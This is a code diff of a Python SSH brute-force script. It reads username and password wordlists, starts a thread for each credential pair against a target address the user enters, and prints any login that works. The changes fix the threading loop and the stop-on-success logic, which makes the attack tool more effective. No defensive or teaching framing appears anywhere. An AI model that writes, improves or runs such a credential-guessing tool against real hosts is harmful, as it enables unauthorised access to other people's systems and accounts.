@@ -1,20 +1,7 @@
 import paramiko, sys, os, termcolor
 import threading, time
 
-stop_flag = 0
-
-def ssh_connectu(username):
-    global stop_flag
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh.connect(host, port=22, username=username,)
-        stop_flag = 1
-        print(termcolor.colored(('[+] Found Username: ' + username), 'green'))
-
-    except:
-        print(termcolor.colored(('[-] Incorrect Username: ' + username), 'red'))
-    ssh.close()
+stop_flag = False
 
 def ssh_connect(username, password):
     global stop_flag
@@ -22,12 +9,15 @@ def ssh_connect(username, password):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         ssh.connect(host, port=22, username=username, password=password)
-        stop_flag = 1
+        stop_flag = True
         print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
-
-    except:
+    except paramiko.ssh_exception.AuthenticationException as e:
         print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
-    ssh.close()
+    
+    #except:
+    #    pass
+        #print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
+    #ssh.close()
 
 host = input('[+] Target Address: ')
 usernames_file = "usernames.txt"
@@ -40,17 +30,20 @@ if os.path.exists(passwords_file) == False:
 
 print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + usernames_file + '* * *') 
 
-with open(usernames_file, 'r') as file:
-    for username in file.readlines():
-        if stop_flag == 1:
-            t.join()
-            exit()
+with open(usernames_file, 'r') as users:
+    for username in users:
         username = username.strip()
-        with open(passwords_file, 'r') as file:
-            for password in file.readlines():
+        with open(passwords_file, 'r') as passwords:
+            for password in passwords:
                 password = password.strip()
-            t = threading.Thread(target=ssh_connect, args=(username, password))
-            t.start()
-            time.sleep(0)
+                if stop_flag:
+                    break
+                t = threading.Thread(target=ssh_connect, args=(username, password))
+                t.start()
+                time.sleep(0)
+                if stop_flag:
+                    break
+        if stop_flag:
+            break
 
 
